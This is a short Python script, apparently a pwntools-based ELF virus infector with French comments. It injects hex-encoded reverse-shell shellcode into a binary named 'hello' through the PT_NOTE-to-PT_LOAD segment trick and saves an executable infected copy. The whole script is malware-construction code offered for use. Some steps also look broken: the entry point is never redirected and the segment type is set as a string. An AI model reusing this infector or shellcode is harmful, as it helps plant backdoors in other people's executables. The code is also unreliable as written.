from pwn import *

# Charger le fichier ELF
elf = ELF('hello')

# Localiser le segment PT_NOTE
for segment in elf.segments:
    if segment.header.p_type == 'PT_NOTE':
        note_segment = segment
        break

# Localiser une section injectée après PT_NOTE
inject_address = note_segment.header.p_vaddr + note_segment.header.p_filesz

# Shellcode pour le reverse shell
shellcode = b'\x48\x31\xc0\x50\x50\x50\x50\x6a\x02\x5f\xb0\x29\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\xb2\x10\xb0\x2a\x0f\x05\x48\x31\xff\x48\x89\xc7\xb0\x21\x0f\x05\x48\xff\xc6\xb0\x21\x0f\x05\x48\xff\xc6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05\x48\x31\xff\xb0\x3c\x0f\x05'

# Injecter le shellcode
elf.write(inject_address, shellcode)

# Changer PT_NOTE en PT_LOAD
note_segment.header.p_type = 'PT_LOAD'

# Enregistrer le fichier ELF infecté
elf.save('hello_infected')

# Mettre les permissions d'exécution
os.chmod('hello_infected', 0o755)
